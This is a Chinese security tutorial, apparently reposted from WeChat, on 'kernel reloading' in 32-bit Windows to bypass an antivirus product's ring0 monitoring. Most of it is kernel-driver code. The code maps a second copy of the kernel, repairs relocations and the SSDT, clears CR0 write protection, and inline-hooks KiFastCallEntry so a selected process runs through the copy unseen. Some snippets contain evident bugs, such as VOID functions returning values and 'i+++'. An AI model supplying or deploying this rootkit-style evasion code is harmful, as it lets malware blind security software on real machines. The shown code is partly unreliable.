<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dYPxBiQ_etfQuOHri9Ry1Q)

  
**首发于奇安信攻防社区： https://forum.butian.net/share/1423**

前言
--

内核重载听起来是一个很高大上的概念，但其实跟PE的知识息息相关，那么为什么会有内核重载的出现呢？

我们知道从ring3进入ring0需要通过`int2e/sysenter(syscall)`进入ring0，而进入ring0之后又会通过`KiFastCallEntry/KiSystemService`去找SSDT表对应响应的内核函数，那么杀软会在这两个地方进行重点盯防。

首先是对`int2e/sysenter`的盯防，我们知道大多数函数都是通过一系列的调用链，最终找到`ntdll.dll`里面的函数，找到调用号后通过`int2e/sysenter`的方式进入ring0，杀软首先会hook `ntdll.dll`来实现监测的效果，这里的话之前已经介绍过了，我们可以通过自己逆向的方式通过汇编定位到`int2e/sysenter`的地址自己重写ring3部分的api来达到绕过杀软的效果

那么再看ring0，我们知道ring3函数进入ring0之后会去找SSDT表，那么这里就有两种监测的方式，一种的话直接在`KiSystemService/KiFastCallEntry`挂个钩子，因为无论是什么函数，`KiSystemService/KiFastCallEntry`是必经之路，还有一种的话就是通过hook SSDT表里面的函数，但是那样的话会很麻烦，所以杀软一般都是通过前者来实现ring0的监控

我们这里以某数字杀软为例，通过汇编代码的对比，发现某数字杀软在`804de978`处更改了一个`jmp`指令，我们可以看一下前后的对比

```
hook前：  
    sub esp,ecx  
    shr ecx,2  
hook后：  
    jmp 867bf958  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们知道要使用Inline hook必须要有5个字节的空间，但是`KiFastCallEntry`这个函数会有很多寄存器的操作，我们如果随便挑选5个字节去操作的话很可能会蓝屏，我们可以看一下某数字杀软挑选的hook点。在这个地方不仅能得到ssdt的地址，还能得到ssdt地址总表，更能得到ssdt索引号，也就是在这个地方不仅不用我们进行寄存器的操作避免蓝屏，还能够直接拿到ssdt表的信息，可谓是风水宝地

那么我们知道了杀软在ring0的监测原理，我们该如何进行绕过呢？

这里就可以使用到内核重载，内核重载顾名思义，就是复制一份内核的代码，当我们复制一份内核的代码之后，让程序走我们自己复制的这一份内核代码，杀软监控只能监控之前的那份内核代码，从而绕过ring0的监控

思路
--

复制内核也是有讲究的，我们知道内核文件本质上也遵循PE结构，那么PE文件的文件偏移和内存偏移也是我们需要考量的一个点，不能说我们直接将内核文件copy一份就能够跑起来，这里就需要进行PE的拉伸。那么既然有PE的拉伸，就要涉及到重定位表，我们要想定位到函数，这里肯定就需要进行重定位表的修复

在PE拉伸完成和修复重定位表过后，我们获得了一份新的内核，但是这里SSDT因为是直接拿过来的，地址肯定会发生变化，所以这里就需要进行SSDT表的修复

在上面的一系列操作完成之后，我们就可以进行hook操作，这里我们上面已经分析过`KiFastCallEntry`的hook方式，我们在同样的位置设置一个hook即可达到内核重载的效果

PE拉伸&重定位表修复
-----------

这里我把PE拉伸跟重定位表的修复放到一个函数里面，首先我们要进行打开文件的操作，那么这里就要实现几个关于文件的函数操作

主要用到`ZwCreateFile`、`ZwReadFile`、`ExAllocatePool`、`ExFreePool`这几个函数

```
// 打开文件  
VOID OpenFile(PHANDLE phFile, PUNICODE_STRING DllName)  
{  
    HANDLE hFile = NULL;  
    NTSTATUS status = STATUS_SUCCESS;  
    IO_STATUS_BLOCK IoStatus;  
    OBJECT_ATTRIBUTES FileAttrObject; // 创建文件属性对象  
  
    // 初始化 OBJECT_ATTRIBUTES 结构体  
    InitializeObjectAttributes(&FileAttrObject, DllName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);  
  
    status = ZwCreateFile(&hFile, GENERIC_ALL, &FileAttrObject, &IoStatus, NULL,FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);  
  
    if (!NT_SUCCESS(status))  
    {  
        DbgPrint("文件创建不成功\n");  
        return FALSE;  
    }  
  
  
    if (phFile)  
    {  
        *phFile = hFile;  
    }  
  
    return TRUE;  
}  
  
// 获取指定文件大小  
ULONG GetFileSize(HANDLE hFile)  
{  
    IO_STATUS_BLOCK IoStatus;  
    NTSTATUS status = STATUS_SUCCESS;  
    FILE_STANDARD_INFORMATION Fileinfo;   
  
    // 获取指定文件大小  
    status = ZwQueryInformationFile(hFile, &IoStatus, &Fileinfo, sizeof(Fileinfo), FileStandardInformation);   
  
    if (!NT_SUCCESS(status))  
    {  
        DbgPrint("文件信息查询失败\n");  
        return FALSE;  
    }  
  
    return Fileinfo.EndOfFile.LowPart;  
}  
  
// 读取文件到内存  
VOID ReadFile(HANDLE hFile, CHAR* Buffer, ULONG readSize)  
{  
    IO_STATUS_BLOCK IoStatus;  
    NTSTATUS status = STATUS_SUCCESS;  
  
    // 读取指定文件到内存中  
    status = ZwReadFile(hFile, NULL, NULL, NULL, &IoStatus, Buffer, readSize, NULL, NULL);  
  
    if (!NT_SUCCESS(status))  
    {  
        DbgPrint("文件读取失败\n");  
        return FALSE;  
    }  
}  

```

那么我们首先读取文件到内存

```
 OpenFile(&hFile, DllName);  
    FileSize = GetFileSize(hFile);  
    szBuffer = (PUCHAR)ExAllocatePool(PagedPool, FileSize);  
    ReadFile(hFile, szBuffer, FileSize);
```

然后进行拉伸PE的操作

首先判断是否为PE文件，即4D5A

```
if (*(PSHORT)szBuffer == 0x5A4D)  

```

然后定位到NT头，偏移为0x3c。判断一下是否为5045，即PE标志

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
PUCHAR NTHeader = *(PULONG)(szBuffer + 0x3C) + szBuffer;  
if (*(PULONG)NTHeader == 0x4550)  

```

然后获取一下可选PE头里面的`SizeOfImage`和`SizeOfHeaders`，这里偏移为`SizeOfImage`的偏移为 0x18+0x38 = 0x50，同理`SizeOfHeaders`的偏移为0x54

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
// 获取SizeOfImage  
ULONG SizeOfImage = *(PULONG)(NTHeader + 0x50);  
  
// 获取SizeOfHeaders  
ULONG SizeOfHeaders = *(PULONG)(NTHeader + 0x54);  

```

然后使用`ExAllocatePool`申请一块空间并用`MmIsAddressValid`判断是否可用，避免蓝屏

```
PUCHAR szBufferSize = ExAllocatePool(NonPagedPool, SizeOfImage);  
  
if (!MmIsAddressValid(szBufferSize))    // 检验是否该内存是否有权限操作  
{  
    DbgPrint("Memory error\n");  
    return NULL;  
}  

```

那么我们将PE头拷贝到我们申请的内存空间里面并定义一系列指针指向头

```
 // 拷贝PE头  
            RtlCopyMemory(szBufferSize, szBuffer, PEHeaderSize);  
  
            // 获取NT头  
            PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)szBufferSize)->e_lfanew + szBufferSize);  
  
            // 获取标准PE头  
            PIMAGE_FILE_HEADER FileHeader = &NtHeader->FileHeader;  
  
            // 获取可选PE头  
            PIMAGE_OPTIONAL_HEADER OptionalHeader = &NtHeader->OptionalHeader;  
  
            // 获取可选PE头大小  
            ULONG SizeOfOptional = FileHeader->SizeOfOptionalHeader;  
  
            // 获取节的数量  
            SHORT SectionNumber = FileHeader->NumberOfSections;  
  
            // 获取节表位置  
            PUCHAR SectionBaseAddr = (PUCHAR)((PUCHAR)NtHeader + 0x4 + 0x14 + SizeOfOptional);  
            PUCHAR pSectionBaseAddr = SectionBaseAddr;
```

然后进行节表的拷贝，因为我们已经获取到了节的数量，所以可以直接使用遍历的方式拷贝，这里我们定义三个变量获取节中的`VirtualAddress`、`SizeOfRawData`、`PointerToRawData`属性，分别在0xc、0x10、0x14的位置，

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
 // 拷贝节  
            CHAR Name[0x9] = { 0 };  
  
            for (int i = 0; i < SectionNumber; i++)  
            {  
                RtlCopyMemory(Name, pSectionBaseAddr, 0x8);  
                DbgPrint(("Name: %s\n", Name));  
                  
                ULONG PointerToRawData = *(PULONG)(pSectionBaseAddr + 0x14);  
                ULONG SizeOfRawData = *(PULONG)(pSectionBaseAddr + 0x10);  
                ULONG VirtualAddress = *(PULONG)(pSectionBaseAddr + 0xC);  
  
                RtlCopyMemory(szBufferSize + VirtualAddress, szBuffer + PointerToRawData, SizeOfRawData);  
  
                pSectionBaseAddr += 0x28; // 下一个节  
            }
```

然后我们再对重定位表进行修复，首先看下重定位表的结构，位于数据目录项的第6个

```
typedef struct _IMAGE_DATA_DIRECTORY {  
    DWORD   VirtualAddress;  
    DWORD   Size;  
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;  

```

跟导出表相同，VirtualAddress存放的是指向真正重定位表地址的rva，而Size重定位表的大小，通过RVA->FOA在FileBuffer定位后得到真正重定位表的结构如下

```
typedef struct _IMAGE_BASE_RELOCATION {  
    DWORD   VirtualAddress;  
    DWORD   SizeOfBlock;  
} IMAGE_BASE_RELOCATION;  
typedef IMAGE_BASE_RELOCATION ，* PIMAGE_BASE_RELOCATION;  

```

这里的VirtualAddress还是RVA，SizeOfBlock则是重定位表的核心结构，存储的值以字节为单位，表示的是重定位表的大小，那么如果我们要知道重定位表结构的数量该怎么办呢？

这里规定在最后一个结构的VirtualAddress和SizeOfBlock的值都为0，这里就可以进行判断来获取重定位表有多少个结构

我们来看一看直观的重定位表图，假设我们这里重定位结构的数量为3，那么在最后8字节即VirtualAddress和SizeOfBlock的值都为0，可以说重定位表就是很多个块结构所构成的。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在每一块结构的VirtualAddress和SizeOfBlock里面，都有很多宽度为2字节的十六进制数据，这里我们称他们为具体项。在内存中页大小的值为1000H，即2的12次方，也就是通过这个1000H就能够表示出一个页里面所有的偏移地址。而具体项的宽度为16位，页大小的值为低12位，那么高4位是用来表示什么呢？

这里高4位只可能有两种情况，0011或0000，对应的十进制就是3或0。

当高4位的值为0011的时候，我们需要修复的数据地址就是VirtualAddress + 低12位的值。例如这里我的VirtualAddress是0x12345678，具体项的数值为001100000001，那么这个值就是有意义的，需要修改的RVA = 0x12345678+0x00000001 = 0x12345679。

当高4位的值为0000的时候，这里就不需要进行重定位的修改，这里的具体项只是用于数据对齐的数据。

也就是说，我们如果要进行重定位表的修改，就只需要判断具体项的高4位是否为0011，若是则进行重定位表的修复即可

实现代码如下

```
 KernelBaseRelocation =   
        (PIMAGE_BASE_RELOCATION)(NewKernelImageBase + KernelNtHeaders->OptionalHeader.DataDirectory[5].VirtualAddress);  
  
    while (KernelBaseRelocation->SizeOfBlock != 0 && KernelBaseRelocation->VirtualAddress != 0)  
    {  
        // 要修改的重定位表的数量  
        NumberOfModify = (KernelBaseRelocation->SizeOfBlock - 8) / 2;  
  
        // 得到索引Base的偏移  
        BaseAddr = (PSHORT)((ULONG)KernelBaseRelocation + 8);  
  
        while (NumberOfModify--)  
        {  
              
            //得到Base  
            Base = *BaseAddr;  
  
            // 判断高4位是否为3，若为3则修改  
            if (*BaseAddr>>12 == 3)  
            {  
                // 清除属性位  
                Base = Base & 0x0FFF;  
  
                // 得到要修改全局变量的索引  
                PULONG AddOfModify = (PULONG)(NewKernelImageBase + KernelBaseRelocation->VirtualAddress + Base);  
  
                *AddOfModify = *AddOfModify - KernelNtHeaders->OptionalHeader.ImageBase + (ULONG)OldKernelImageBase;  
            }  
  
            // 得到下一个BaseAddr  
            BaseAddr++;  
        }  
  
        // 下一个重定位表  
        KernelBaseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG)KernelBaseRelocation + KernelBaseRelocation->SizeOfBlock);  
    }
```

SSDT表修复
-------

因为SSDT结构有多层，所以要分别进行运算。首先确定新SSDT在哪个位置，用导出`KeServiceDescriptorTable`导出的老内核的SSDT结构，然后用原来的SSDT地址+相对加载地址即可得到新的SSDT地址。

然后再修正SSDT函数中的地址。方法是在原来的函数地址上+ 相对加载地址，即相对加载地址 = 新内核加载地址 - 老内核加载地址

```
PSystemServiceTable KeServiceTable = KeServiceDescriptorTable;  // SSDT  
PSystemServiceTable KeServiceTableShadow = (PSystemServiceTable)((ULONG)KeServiceTable - 0x40); // SSDTShadow  
  
LONG Offset = (LONG)NewKernelBaseAddr - (LONG)KernelBaseAddr;   // 新SSDT与旧SSDT的相对偏移  
  
PSystemServiceTable NewKeServiceTable = (PSystemServiceTable)((ULONG)KeServiceTable + Offset);  // 新SSDT地址  
  
// 修复 FunctionsAddrTable 、 FunctionsArgsAddrTable 、 FunctionsLimit   
NewKeServiceTable->FunctionsAddrTable = (PULONG)((ULONG)KeServiceTable->FunctionsAddrTable + Offset);   // 函数地址表  
NewKeServiceTable->FunctionsArgsAddrTable = (PUCHAR)(KeServiceTable->FunctionsArgsAddrTable + Offset);  // 函数参数表  
NewKeServiceTable->FunctionsLimit = KeServiceTable->FunctionsLimit; // 服务个数  

```

然后依次遍历修改

```
 for (ULONG i = 0; i < NewKeServiceTable->FunctionsLimit; i+++)  
    {//新的函数地址再加上相对加载地址，得到现在的ssdt函数地址  
       NewKeServiceTable->FunctionsAddrTable[i] += Offset;  
    }
```

hook KiFastCallEntry
--------------------

我们在之前已经分析过了hook的地点，那么这里我们直接使用inline hook的方式即可，但是这里只适用于单核环境下，如果是多核情况下发现线程切换的情况下需要使用其他方法来进行hook

这里我们首先写一个判断，如果是我们想要获得的程序进程就走我们自己重载的内核

```
LONG FilterFunc(ULONG ServiceTableBase,ULONG FuncIndex,ULONG OrigFuncAddress)  
{  
    if (ServiceTableBase==(ULONG)KeServiceDescriptorTable.ServiceTableBase)  
    {//比较当前调用的进程是不是ce  
        if (!strcmp((char*)PsGetCurrentProcess()+0x174,"notepad.exe"))  
        {  
            return pNewSSDT->ServiceTableBase[FuncIndex];  
        }  
    }  
    return OrigFuncAddress;  
}  

```

然后写一个asm使用汇编语句进行调用`FilterFunc`

```
VOID __declspec(naked) MyFunction()  
{  
 __asm  
 {  
  pushad  
  pushfd  
 }  
  
 // 测试是否hook成功  
 __asm  
 {  
  push ebx  
  push eax  
  push edi  
  call FilterFunc  
 }  
  
 // 修改ebx  
 __asm  
 {  
  mov dword ptr ss : [esp + 0x14] , eax  
 }  
  
 __asm  
 {  
  popfd  
  popad  
 }  
  
 // 执行原代码  
 __asm  
 {  
  sub esp, ecx  
  shr ecx, 2  
 }  
  
 __asm  
 {  
  jmp RetAddr  
 }  
}  

```

然后进行Inline hook，这里有一个注意的点就是页在默认情况下是只读的，这里就需要修改cr0寄存器的值来进行读写

```
// 关闭页只读保护  
void _declspec(naked) ShutPageProtect()  
{  
    __asm  
    {  
        push eax;  
        mov eax, cr0;  
        and eax, ~0x10000;  
        mov cr0, eax;  
        pop eax;  
        ret;  
    }  
}  
  
// 开启页只读保护  
void _declspec(naked) OpenPageProtect()  
{  
    __asm  
    {  
        push eax;  
        mov eax, cr0;  
        or eax, 0x10000;  
        mov cr0, eax;  
        pop eax;  
        ret;  
    }  
}  

```

这里首先定位要hook的地址，利用特征码搜索的方式，我们首先看下要hook的两行的硬编码为`2be1c1e902`，放到一个数组里面

```
UCHAR shell1[] = { 0x2B, 0xE1, 0xC1, 0xE9, 0x02 };  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后为了避免重复的硬编码，这里再判断一下`80542602`这个地方的硬编码是否匹配，若匹配则证明定位准确，同样放在数组里面

```
UCHAR shell2[] = { 0x8B, 0x1C, 0x87 };  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里写一个比较字符的函数

```
ULONG MyCompareString(PUCHAR string1, PUCHAR string2, ULONG number)  
{  
 // 计数  
 ULONG i = 0;  
  
 while (number--)  
 {  
  if (*(string1 + i) == *(string2 + i))  
  {  
   i++;  
  }  
  else  
  {  
   return FALSE;  
  }  
 }  
  
 return TRUE;  
}  

```

然后进行特征码的遍历

```
 OldKernelImageBase2 = (PUCHAR)OldKernelImageBase;  
 OldKernelSizeOfImage2 = OldKernelSizeOfImage;  
   
 while (OldKernelSizeOfImage2--)  
 {  
  if (FALSE == MyCompareString(shell1, OldKernelImageBase2, 5))  
  {  
   OldKernelImageBase2++;  
  }  
  else  
  {  
   OldKernelImageBase2 = OldKernelImageBase2 - 3;  
   if (FALSE == MyCompareString(shell2, OldKernelImageBase2, 3))  
   {  
    OldKernelImageBase2 = OldKernelImageBase2 + 4;  
    continue;  
   }  
   else  
   {  
    HookAddr = (ULONG)OldKernelImageBase2 + 3;  
    DbgPrint("hook_address:%x\n", HookAddr);  
    break;  
   }  
  }  
 }
```

然后进行hook `FastCallEntry`的操作

```
void HookKiFastCallEntry()  
{  
    UCHAR jmp_code[5];  
    jmp_code[0]=0xe9;  
      
    *(ULONG *)&jmp_code[1]=(ULONG)MyKiFastCallEntry-5-hookaddr;  
      
    RetAd = hookaddr + 5;  
    ShutPageProtect();  
    //inline hook  
    RtlCopyMemory((PVOID)addr_hookaddr,jmp_code,5);  
    OpenPageProtect();  
}  

```

驱动卸载
----

在驱动卸载的地方，我们把原来的硬编码写回，这里为了防止多核状态下的线程切换，直接使用`cmpxchg8b`指令写回

```
VOID __declspec(naked) _fastcall HookFunction(ULONG destination, ULONG exchange, ULONG compare)  
{  
 __asm  
 {  
  push ebx  
  push ebp  
  mov ebp, ecx    // destination = ebp  
  mov ebx, [edx]  // exchange低4字节  
  mov ecx, [edx + 4]  // exchange高4字节  
  mov edx, [esp + 8 + 4]  // compare给edx  
  mov eax, [edx]  
  mov edx, [edx + 4]  
  lock cmpxchg8b qword ptr[ebp]  
  pop ebp  
  pop ebx  
  retn 4  
 }  
}  

```

实现效果
----

这里首先看一下没有内核重载之前`KiFastCallEntry`的代码

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在`80542605`的地方汇编语句为`sub esp,ecx`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后我们加载驱动，看到hook的地址正是`80542605`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里我们再定位到`80542605`的位置发现已经是我们自己写的函数

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里跳转过去看看，和我们自己写的`MyFunction`传入的汇编代码是相同的

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们再去通过`KiFastCallEntry`定位一下hook点，发现也已经被修改

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里为了方便查看效果，我用ssdt hook了`NtOpenProcess`函数，使用ollydbg附加进程可以发现没有`notepad.exe`这个进程，这是因为OD走的是原内核，所以在进程列表里面是没有`notepad.exe`这个进程

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后这里卸载驱动

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

再去定位到`80542605`地址处，已经恢复成原汇编指令

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

加下方wx，拉你入群一起学习:

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

Spring Beans RCE分析(附带环境源码)



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491627&idx=1&sn=1384bf26136d463eb68ba5b581d541fc&chksm=ce675a97f910d3813bc0ce58cd0fbba0eb141f8b7f3f75a81e29541954ee4d31e8aae6d4b117&scene=21#wechat_redirect)

[

初探Listener内存马



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491386&idx=1&sn=429273c3d0561fa214705c7f20ff8697&chksm=ce64a586f9132c90a38391ebdfb4a7333320b40d9ef33227f16422b183afb4338c70bd658f36&scene=21#wechat_redirect)

[

对于挖矿的检测以及防御方案



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491552&idx=1&sn=2b22f8671efbd4c335ee4e7841836de8&chksm=ce64a55cf9132c4a040620126973a86ea7f99dcd5294f6aa40d9588378442e23fab369e707af&scene=21#wechat_redirect)

[

记一次内网渗透靶场学习



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247490058&idx=1&sn=37b0fab83a32fde96b10c909b14ca264&chksm=ce64a0b6f91329a0164beadd5d8556c35755c3a5bbf804e01f26450037f7408247a4191e7740&scene=21#wechat_redirect)

[

hvv面试题整理(补充版)



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489951&idx=1&sn=83c0023bb57007ec73cc69ffbc7bc47e&chksm=ce64a323f9132a35490b3820e7894cef2914d297e2285ae24131c08c44c6667abb2039681019&scene=21#wechat_redirect)

[

基于PEB断链实现进程/模块隐藏



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489342&idx=1&sn=d4711ef8f856039f1b15b091191909a8&chksm=ce64ad82f913249484f2ec4c5cc4a3f0a0a175874e729aa26079df5a1f11b7a5035278d5659a&scene=21#wechat_redirect)

[

用户层下API的逆向分析及重构



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247488435&idx=1&sn=788dde3d08b982f17d48b9fa2301b9fa&chksm=ce64a90ff91320190a04ef6eae5e600f7ddf8f1578faccbbb97bdb39a2587743c3dbb70291d0&scene=21#wechat_redirect)

[

进程伪装详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247488386&idx=1&sn=aa6a3e18f73a7c12daf9732bb57e1d54&chksm=ce64a93ef9132028b7e111e39b66f1e4301c39c9c7b48e6ccc48df8a3b6c24f804c640cf99d9&scene=21#wechat_redirect)

[

ring0下的Inline hook



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247488316&idx=1&sn=1cf722021b5555e357ab16e613611b14&chksm=ce64a980f913209626349a45d1f471d1cf414b050952027d8601fece1ee51c2132458c064f3c&scene=21#wechat_redirect)

[

DLL劫持详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247488302&idx=1&sn=34d174a930de7802e80c2b26ffe93a24&chksm=ce64a992f91320840a5d6a2b25a9ad6eeb78c05a59668c0e669c1b51c8a9bc6b10828c90486d&scene=21#wechat_redirect)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)